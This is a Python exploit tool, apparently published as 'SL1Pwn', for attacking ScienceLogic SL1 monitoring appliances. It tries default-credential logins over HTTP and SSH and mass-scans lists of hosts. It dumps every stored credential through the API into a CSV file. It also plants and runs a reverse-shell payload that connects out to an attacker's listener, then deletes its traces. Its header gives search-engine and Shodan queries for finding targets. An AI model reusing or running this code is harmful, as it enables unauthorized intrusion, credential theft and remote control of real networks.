# SL1Pwn: All ScienceLogic SL1 devices
# Date: 06/29/2023
# Author: Vincent Mentz (@sm00v) of 3Nail Information Security
# Vendor Homepage: https://sciencelogic.com
# Software Link: https://support.sciencelogic.com/s/platform-downloads
# Version: All versions vulnerable under the condition that they have a single device and collector configured
# Tested on: SL1 - 11.2.1 through 11.3.1
# CVE: None
# Dork: intitle:"ScienceLogic EM7 - Login"
# Shodan: em7
# Hi VXUG :)

import json
import os
import socket
import struct
import time
import warnings
import requests
import bs4
from bs4 import GuessedAtParserWarning, XMLParsedAsHTMLWarning
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import paramiko
import concurrent.futures
import threading
from random import *
import random
import argparse
import base64
import datetime

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
warnings.filterwarnings('ignore', category=GuessedAtParserWarning)
warnings.filterwarnings('ignore', category=XMLParsedAsHTMLWarning)

class Shell:
    def __init__(self, session, host):
        self.shell_name = ''.join(
            random.choice('_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for x in range(6))
        self.session = session
        self.host = host

    def get_csrf(self):
        url = f"{self.host}/em7/index.em7?exec=admin&act=admin_dynamic_app"
        headers = {"Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                   "Sec-Ch-Ua-Platform": "\"\"",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        output = self.session.get(url, headers=headers, verify=False, timeout=10)
        self.csrf_token = output.text.split("var csrf_token =")[1].split(";")[0].strip().replace("'", "")

    def create_action(self):
        url = f"{self.host}/em7/index.em7?exec=registry_policies_actions_editor&width=675&modal=1"
        headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                   "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "iframe",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}

        data = {"action_name": self.shell_name, "action_state": "1", "description": '', "roa_id": "0",
                "action_type": "5", "email_subject": "%S Event: %M", "email_priority": "3",
                "email_body": "Severity: %S\r\nFirst Occurred: %D\r\nLast Occurred: %d\r\nOccurrences: %c\r\nSource: %Z\r\nOrganization: %O\r\nDevice: %X\r\n\r\nMessage: %M\r\n\r\nSent by Automation Action: %N\r\n\r\nView this event at: %H",
                "trap_host": '', "trap_cred_id": "48", "trap_oid": '', "vb_value_type": "b", "vb_value": '',
                "set_host": '', "set_cred_id": "48", "set_run_on_collector": "0", "oid": '', "value_type": "b",
                "value": '', "snippet_cred_id": "0", "snippet_run_on_collector": "0", "collection_env": '',
                "snippet_code": f"import socket,subprocess,os\r\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{args.LISTENER}\",{args.LISTENER_PORT}))\r\nos.dup2(s.fileno(),0)\r\nos.dup2(s.fileno(),1)\r\nos.dup2(s.fileno(),2)\r\np=subprocess.call([\"/bin/sh\",\"-i\"]);",
                "sql_cred_id": "88", "sql_run_on_collector": "0", "sql_query": '', "ticket_status": "-1",
                "ticket_severity": "-1", "ticket_notes": '', "sns_subject": "%S event on %X in org %O",
                "cred_id": "89", "sns_topic_arn": '', "sns_region_name": "us-east-1",
                "sns_body": "Severity: %S\r\nFirst Occurred: %D\r\nLast Occurred: %d\r\nOccurrences: %c\r\nSource: %Z\r\nOrganization: %O\r\nDevice: %X\r\n\r\nMessage: %M\r\n\r\nSent by Automation Action: %N\r\n\r\nView this event at: %H",
                "collection_env": '', "snippet_run_on_collector": "0", "in_param_val": '', "save": "Save"}

        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        code = output.status_code
        if code == 200:
            # print(output.text)
            self.action_id = output.text.split('action_id=')[1].split('"')[0]
            print(f'[*] Created action with name: {self.shell_name}')
            return self.shell_name, self.action_id
        else:
            exit('[-] Failed to create an Action in Registry, exiting')

    def delete_action(self):
        self.get_csrf()
        url = f"{self.host}/em7/index.em7?exec=registry&act=registry_policies_actions&ajax=regtable&doc_type=json&table=policies_actions&search%5Baction_name%5D={self.shell_name}"
        headers = {"Sec-Ch-Ua": "", "Accept": "application/json, text/javascript, */*; q=0.01",
                   "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"action_name": self.shell_name, "action_type_name": '', "action_id": '', "action_state": '',
                "company": '',
                "user": '', "date_edit": '', "bulk_sel[]": str(self.action_id), "bulk_function": "delete",
                "csrf_form_token": self.csrf_token}
        # print(headers, data)
        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        if output.status_code == 200:
            print(f'[*] Deleted action[{self.action_id}]: {self.shell_name}')
            # print(output.text)
        else:
            print('[-] Failed to delete the Action in Registry')

    def create_schedule(self):
        url = f"{self.host}/em7/index.em7?exec=schedule_editor_decoupled&width=675"
        headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                   "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "docusment",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"schedule_name": self.shell_name, "visibility": "Organization", "roa_id": "0", "owner": "1",
                "start_time": f"2020-01-01 12:00:00", "end_time": '', "timezone": "157", "recurrence": "0",
                "recur_expr": "0", "recur_interval": "0", "recur_until": "0", "recur_until_date": '',
                "nth_day_recur_until": "0", "nth_day_recur_until_date": '', "save": "Save"}
        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        code = output.status_code
        if code == 200:
            self.schedule_id = \
            output.content.decode('utf-8').split("<input type='hidden' name='schedule_id' value='")[1].split("'")[0]
            print(f'[*] Created schedule successfully: {self.schedule_id}')
            return self.schedule_id
        else:
            exit('[-] Failed to create a schedule in Registry, exiting')

    def delete_schedule(self):
        url = f"{self.host}/em7/index.em7?exec=registry&act=registry_schedules_rba&ajax=regtable&doc_type=json&table=schedules"
        headers = {"Sec-Ch-Ua": "", "Accept": "application/json, text/javascript, */*; q=0.01",
                   "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"schedule_id": '', "description": '', "aligned_tasks": '', "timezone": '', "dtstart": '',
                "duration": '', "sch_interval": '', "end_date": '', "owner": '', "roa_id": '', "visibility": '',
                "bulk_sel[]": self.schedule_id, "bulk_function": "delete"}
        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        if output.status_code == 200:
            print(f'[*] Deleted schedule[{self.schedule_id}]: {self.shell_name}')
        else:
            print('[-] Failed to delete the Action in Registry')

    def get_device_id(self):
        url = f"{self.host}/em7/index.em7?exec=registry_policies_automation_editor"
        headers = {"Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"",
                         "Upgrade-Insecure-Requests": "1",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                         "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                         "Sec-Fetch-Dest": "document",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        output = self.session.get(url, headers=headers, verify=False, timeout=10)
        try:
            self.device_id = output.text.split("devices_opt_1;")[1].split('" value=')[0]
            return True
        except Exception as e:
            print('[-] There are no devices in this SL1 so a shell cannot be popped unless one is added.')
            return False


    def create_policy_id(self):
        #create the id
        url = f"{self.host}/em7/index.em7?exec=registry_policies_automation_editor&width=700"
        headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                         "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                         "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                         "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"policy_name": self.shell_name, "policy_type": "scheduled", "policy_state": "1", "priority": "0",
                      "roa_id": "100", "sev_above": "1", "eseverity": "2", "s_time": "300", "s_time_flag": "0",
                      "s_action": "0", "sched_active": "no_sched", "regex_logic": "0", "regex": '', "b_time": "0",
                      "align_with": "9", "save": "Save",
                      "schedules_add[]": self.schedule_id, "actions_add[]": self.action_id, "actions_active[]": self.action_id,
                      "schedules_active[]": self.schedule_id}
        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        print('[+] Created automation template')
        time.sleep(.5)

        #query policy id
        url = f"{self.host}/em7/index.em7?exec=registry&act=registry_policies_automation&ajax=regtable&doc_type=json&table=policies&search%5Bpolicy_name%5D={self.shell_name}&_=1687989002196"
        headers = {"Sec-Ch-Ua": "", "Accept": "application/json, text/javascript, */*; q=0.01",
                         "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0",
                         "Sec-Ch-Ua-Platform": "\"\"", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                         "Sec-Fetch-Dest": "empty",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        output = self.session.get(url, headers=headers, verify=False, timeout=10)
        # print(output.text)
        self.policy_id = json.loads(output.text)['rows'][0]['_id_']
        print('[+] Updated automation template')

    def create_automation(self):
        self.create_policy_id()
        if self.get_device_id():
            url = f"{self.host}/em7/index.em7?exec=registry_policies_automation_editor&width=700"
            headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                       "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1",
                       "Content-Type": "application/x-www-form-urlencoded",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                       "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                       "Sec-Fetch-Dest": "document",
                       "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
            data = {"policy_id": self.policy_id, "policy_name": self.shell_name, "policy_type": "scheduled",
                    "policy_state": "1",
                    "priority": "0", "roa_id": "0", "sev_above": "1", "eseverity": "2", "s_time": "300",
                    "s_time_flag": "0", "s_action": "0", "sched_active": "no_sched", "regex_logic": "0", "regex": '',
                    "b_time": "0", "align_with": "1", "save": "Save",
                    "devices_add[]": self.device_id, "actions_active[]": self.action_id, "devices_active[]": self.device_id,
                    "schedules_active[]": self.schedule_id}
            output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
            code = output.status_code
            if code == 200:
                # self.policy_id = \
                # output.content.decode('utf-8').split("<input type='hidden' name='policy_id' value='")[1].split("'")[0]
                print(f'[*] Created automation successfully: {self.policy_id}')
                return self.policy_id
            else:
                exit('[-] Failed to create automation in Registry, exiting')
        else:
            return False

    def delete_automation(self):
        url = f"{self.host}/em7/index.em7?exec=registry&act=registry_policies_automation&ajax=regtable&doc_type=json&table=policies"
        headers = {"Sec-Ch-Ua": "", "Accept": "application/json, text/javascript, */*; q=0.01",
                   "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"policy_name": '', "ap_id": '', "policy_state": '', "policy_priority": '', "roa_id": '',
                "devs": '', "events": '', "actions": '', "edit_user": '', "edit_date": '', "bulk_sel[]": self.policy_id,
                "bulk_function": "delete"}
        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        if output.status_code == 200:
            print(f'[*] Deleted automation[{self.policy_id}]: {self.shell_name}')
        else:
            print('[-] Failed to delete the Automation in Registry')

    def execute_automation(self):
        time.sleep(3)
        url = f"{self.host}/em7/index.em7?exec=registry&act=registry_policies_automation"
        headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                   "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"policyid": self.policy_id}
        output = self.session.post(url, headers=headers, data=data)
        if output.status_code == 200:
            input('[+] Run book executed! Press enter when ready to clean up...')

class Login:
    def __init__(self, host):  # , proxy):
        if args.SSH:
            self.em7_ssh_login(f'{args.TARGET}:{args.TARGET_PORT}')
            exit()
        # print(f'[*] Logging into {host}')
        url = f"{host}/em7/"
        # proxies = {'https': 'http://{proxy}', 'http': 'http://{proxy}'}
        self.session = requests.session()
        # self.session.proxies.update(proxies)
        self.host = host
        headers = {"Upgrade-Insecure-Requests": "1",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                   "Sec-Ch-Ua-Platform": "\"\"", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "en-US,en;q=0.9"}
        output = self.session.get(url, headers=headers, verify=False, timeout=10)
        content = output.content.decode('utf-8')
        self.uid = content.split('LOGIN_user[')[1].split("]'")[0]
        self.pwd = content.split('LOGIN_pwd[')[1].split("]'")[0]
        self.ui_login()
        self.api_login()
        if args.SHELL:
            shell = Shell(self.session, self.host)
            # shell.get_device_id() # program will exit if this fails because shell cannot work without devices in SL1
            self.shell_name, self.action_id = shell.create_action()
            self.schedule_id = shell.create_schedule()
            self.policy_id = shell.create_automation()
            if self.policy_id:
                shell.execute_automation()
            else:
                pass
            # Cleanup
            time.sleep(3)
            shell.delete_action()
            shell.delete_schedule()
            shell.delete_automation()
        elif args.DUMP:
            dump = Dump(self.session, self.host)
            dump.control()


    def ui_login(self):
        url = f"{self.host}/login.em7"
        headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0",
                   "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                   "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        data = {"signon": "1", "FORWARD_QS": '', "FORWARD_MQS": '', "local_timezone": "America/Chicago",
                f"LOGIN_user[{self.uid}]": args.USERNAME, f"LOGIN_pwd[{self.pwd}]": args.PASSWORD}
        output = self.session.post(url, headers=headers, data=data, verify=False, timeout=10)
        content = output.text
        header = output.headers
        cookies = output.cookies
        code = output.status_code
        if code == 200 and '/em7/index.em7?' in content:
            self.cookie = cookies.get_dict()['PHPSESSID']
            print(f'[+] UI Login Success! {self.host}')
        # else:
        #     print('[-] Failed UI Login, trying API')

    def api_login(self):
        try:
            url = f"{self.host}/api/credential"
            basic = base64.b64encode(f'{args.USERNAME}:{args.PASSWORD}'.encode())
            headers = {"Cache-Control": "max-age=0", "Authorization": f"Basic {basic.decode('utf-8')}",
                       "Upgrade-Insecure-Requests": "1",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                       "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                       "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                       "Accept-Language": "en-US,en;q=0.9",
                       "Connection": "close"}
            # self.session.headers.update(headers)
            response = self.session.get(url, headers=headers, verify=False, timeout=10, allow_redirects=True)
            code = response.status_code
            response_header = str(response.headers)
            if code == 200 and '/api/account' in response_header:
                print(f'[+] API Login Success! {self.host}')
                successful.append(url)
            # else:
            #     print(f'[-] Failed API login. {code} {self.host}')
        except Exception as e:
            # print(e)
            # print(f'[-] Failed login. Timeout...')
            pass

    def em7_ssh_login(self, host):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            conn = ssh.connect(host, username=args.USERNAME, password=args.PASSWORD, timeout=5, allow_agent=False, look_for_keys=False)
            if conn is None:
                print(f'[+] Possible success {host}')
            else:
                print(f'[-] Failed SSH login. {host}')
        except paramiko.ssh_exception.AuthenticationException:
            print(f'[-] Failed SSH login. {host}')
        except paramiko.ssh_exception.SSHException:
            print(f'[-] Probably Not SSH. {host}')

class Dump:
    def __init__(self, session, host):
        self.host = host
        self.session = session

    def control(self):
        print(f'[*] Dumping {self.host} stored api credentials')
        try:
            self.first_page_data = self.parse_first_page(self.get_creds())
            self.second_page_data = self.parse_second_page(self.host, self.first_page_data, self.session)
            print(self.second_page_data)
            exit()
            self.third_page_data = self.parse_password_pages(self.host, self.second_page_data, self.session)
        except Exception as e:
            print(f'[-] Failed to dump {self.host} because {e}')

    def get_creds(self):
        try:
            url = f"{self.host}/api/credential"
            basic = base64.b64encode(f'{args.USERNAME}:{args.PASSWORD}'.encode())
            headers = {"Cache-Control": "max-age=0", "Authorization": f"Basic {basic.decode('utf-8')}",
                       "Upgrade-Insecure-Requests": "1",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                       "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                       "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                       "Accept-Language": "en-US,en;q=0.9",
                       "Connection": "close"}
            # self.session.headers.update(headers)
            response = self.session.get(url, headers=headers, verify=False, timeout=10, allow_redirects=True)
            code = response.status_code
            response_header = str(response.headers)
            if code == 200 and '/api/account' in response_header:
                return response.text
                # print(f'[+] API Login Success! {self.host}')
                # successful.append(url)
            else:
                print(f'[-] Failed API login. {code} {self.host}')
        except Exception as e:
            print(e)
            print(f'[-] Failed login. Timeout...')

    def parse_first_page(self, data):
        soup = bs4.BeautifulSoup(data, 'lxml')
        cred_master = soup.find_all('link')  # strip white-space
        cred_master_links = [link.get('uri') for link in cred_master]
        return cred_master_links

    def parse_second_page(self, host, data, session):
        import csv
        csv_file = open(args.OUTFILE, 'a', encoding='UTF8', newline='')
        csv_writer = csv.writer(csv_file)
        category = ''
        for uri in data:
            new_category = uri.split('/api/credential/')[1].split('/')[0]
            if new_category != category:
                print(f'\n{category.upper()}\n')
                category = new_category
                csv_writer.writerow([new_category.upper(),'',''])
            cred_page = f'{host}{uri}?limit=100000'
            creds_data = json.loads(session.get(cred_page).text)['result_set']
            wrote_header = False
            for cred_link in creds_data:
                uri = cred_link['URI']
                description = cred_link['description']
                cred_data = json.loads(session.get(f'{host}{uri}').text)
                print(f'[{description}]')
                csv_header = [x for x in cred_data]
                csv_data = [cred_data[x] for x in cred_data]

                if not wrote_header:
                    csv_writer.writerow(csv_header)
                    wrote_header = True
                csv_writer.writerow(csv_data)
            # wrote_header = False
            for x in range(5):#separate all cred categories
                csv_writer.writerow(['','',''])

class Scan:
    def __init__(self):
        self.targets_list = []

    def sort_host(self, host, port):
        if port != 443:
            host = f'http://{host}:{port}'
            self.targets_list.append(host)
        else:
            host = f'https://{host}:{port}'
            self.targets_list.append(host)

    def parse_file(self, file):
        for x in file:
            ip = ':'.join(x.split(':')[:-1]) #this accounts for IPv6 addresses
            if len(ip) > 16:
                ip = f'[{ip}]'
            port = int(x.split(':')[-1].strip())
            self.sort_host(ip, port)
        return self.targets_list

def argparser(): # Initialize arguments
    commands = """
    ------------------------------
    Author: Vincent Mentz - @sm00v
    
    Cababilities:
        This tool can be utilized to obtain a reverse shell, dump 
        credentials, and login via HTTP and SSH (single or bulk) 
        on ScienceLogic SL1 devices.
        
    Usage:
        [Test login with default creds on port 443]: python3 sl1pwn.py -t 1.1.1.1
        [Test ssh login with custom creds]: python3 sl1pwn.py -t 1.1.1.1 -p 22 -user em7admin -pass admin123
        [Pop shell on SL1 device]: python3 sl1pwn.py -t 1.1.1.1 -shell -L 2.2.2.2 -P 4444
        [Dump all creds stored in SL1]: python3 sl1pwn.py -t 1.1.1.1 -dump -o target_creds.csv
        [Scan a combo IP:PORT list file]: python3 sl1pwn.py -scan targets.txt -threads 25
            """
    parser = argparse.ArgumentParser(description="NameCheap CNAME Record Adder >:D", epilog=commands, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-t", "--TARGET", help="Host IP to target", default=None)
    parser.add_argument("-p", "--TARGET_PORT", help="Host port to target", default="443")
    parser.add_argument("-L", "--LISTENER", help="Listener host/ip for reverse shell")
    parser.add_argument("-P", "--LISTENER_PORT", help="Listening port for reverse shell")
    parser.add_argument("-o", "--OUTFILE", help="CSV file to save dumped credentials to", default='sl1_creds.csv')
    parser.add_argument("-user", "--USERNAME", help="Username for SL1 Login", default='em7admin')
    parser.add_argument("-pass", "--PASSWORD", help="Password for SL1 Login", default='em7admin')
    parser.add_argument("-scan", "--SCANFILE", help="File with ip:port combo to scan for successful logins")
    parser.add_argument("-threads", "--THREADS", help="How many threads to scan with", default=10)
    parser.add_argument('-shell', action='store_true', dest='SHELL', help='Attempt to gain a reverse shell', default=False)
    parser.add_argument('-dump', action='store_true', dest='DUMP', help='Attempt to dump stored credentials in SL1 via the API', default=False)
    parser.add_argument('-ssh', action='store_true', dest='SSH', help='Attempt to login via SSH', default=False)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = argparser()

    if args.SCANFILE:
        targets_file = open(args.SCANFILE, 'r').readlines()
        scanner = Scan()
        target_hosts = scanner.parse_file(targets_file)

        #start scanning
        threads = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(args.THREADS)) as executor:
            print('[*] Beginning Scan')
            for host in target_hosts:
                threads.append(executor.submit(Login, host=host))
                threads = []
        print('[*] Done')
    else:
        if args.TARGET == None:
            exit('[-] Please specify a target [IP-ADDRESS]')
        Login(f'https://{args.TARGET}:{args.TARGET_PORT}')
